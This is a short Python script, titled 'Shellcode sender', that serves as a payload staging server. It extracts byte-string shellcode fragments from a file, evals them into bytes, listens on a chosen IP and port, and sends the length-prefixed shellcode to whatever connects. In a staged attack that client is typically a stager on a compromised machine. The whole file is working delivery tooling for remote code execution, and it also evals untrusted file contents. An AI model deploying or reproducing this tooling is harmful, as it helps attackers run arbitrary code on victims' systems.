import socket
import argparse
import re
import struct

def main():
    parser = argparse.ArgumentParser(description="Shellcode sender")
    parser.add_argument("-i", "--ip", required=True)
    parser.add_argument("-p", "--port", type=int, required=True)
    parser.add_argument("-f", "--file_path", required=True)
    args = parser.parse_args()

    with open(args.file_path, 'r') as f:
        content = f.read()

    # Extract all b"..." fragments and join them
    fragments = re.findall(r'b"(.*?)"', content)
    shellcode_str = ''.join(fragments)
    shellcode_bytes = eval(f'b"{shellcode_str}"')

    print(f"[+] Parsed shellcode ({len(shellcode_bytes)} bytes)")

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((args.ip, args.port))
        s.listen(1)
        print(f"[+] Listening on {args.ip}:{args.port}...")
        conn, addr = s.accept()
        with conn:
            print(f"[+] Connection from {addr}")
            conn.sendall(struct.pack('<I', len(shellcode_bytes)))
            conn.sendall(shellcode_bytes)
            print(f"[+] Sent {len(shellcode_bytes)} bytes")

if __name__ == "__main__":
    main()
